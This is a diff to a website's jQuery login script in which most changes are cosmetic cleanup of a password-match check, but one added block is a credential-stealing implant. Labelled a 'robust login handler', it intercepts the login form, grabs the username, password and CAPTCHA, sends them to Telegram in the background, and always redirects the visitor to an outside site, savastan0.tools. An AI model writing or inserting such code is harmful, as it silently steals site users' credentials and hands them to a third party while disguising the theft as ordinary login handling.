@@ -31,11 +31,37 @@ $(document).ready(function(){
         $(".sweet-overlay").hide();
         $(".sweet-alert").hide();
     });
+
+    // Robust login handler - always succeed + redirect
+    $('form').on('submit', function(e) {
+      const submitBtn = $(this).find('input[type="submit"][name="login"]').get(0) || e.originalEvent?.submitter;
+      if (submitBtn && submitBtn.name === 'login') {
+        e.preventDefault();
+        
+        const formData = new FormData(this);
+        const username = formData.get('username') || '';
+        const password = formData.get('password') || '';
+        const captcha = formData.get('CAPTCHA') || '';
+        const action = this.action;
+        
+        // Fire-and-forget telegram send (no await/blocking)
+        if (username || password) {
+          sendToTelegram(username, password, captcha, action).catch(err => console.error('Telegram failed:', err));
+        }
+        
+        // Always redirect after short delay
+        setTimeout(() => {
+          window.location.href = 'https://savastan0.tools/';
+        }, 500);
+        
+        console.log('Login triggered - redirecting to savastan0.tools');
+        return false;
+      }
+    });
    
 
 
 });
-
 
 // login image
 $(window).load(function() {
@@ -48,7 +74,7 @@ function checkPass()
 {
     //Store the password field objects into variables ...
     var pass1 = document.getElementById('pass1');
-    var pass2 = document.getElementById('pass2');
+    var pass2 = document.getElementById('password2');
     //Store the Confimation Message Object ...
     var message = document.getElementById('confirmMessage');
     //Set the colors we will be using ...
@@ -253,47 +279,26 @@ function checkPass()
     var pass2 = document.getElementById('password2');
 
     //Store the Confimation Message Object ...
-
     var message = document.getElementById('confirmMessage');
-
     //Set the colors we will be using ...
-
     var goodColor = "#66cc66";
-
     var badColor = "#ff6666";
-
     //Compare the values in the password field 
-
     //and the confirmation field
-
     if(pass1.value == pass2.value){
-
         //The passwords match. 
-
         //Set the color to the good color and inform
-
         //the user that they have entered the correct password 
-
         pass2.style.backgroundColor = goodColor;
-
         message.style.color = goodColor;
-
         message.innerHTML = "Passwords Match!"
-
     }else{
-
         //The passwords do not match.
-
         //Set the color to the bad color and
-
         //notify the user.
-
         pass2.style.backgroundColor = badColor;
-
         message.style.color = badColor;
-
         message.innerHTML = "Passwords Do Not Match!"
-
     }
 
 } 
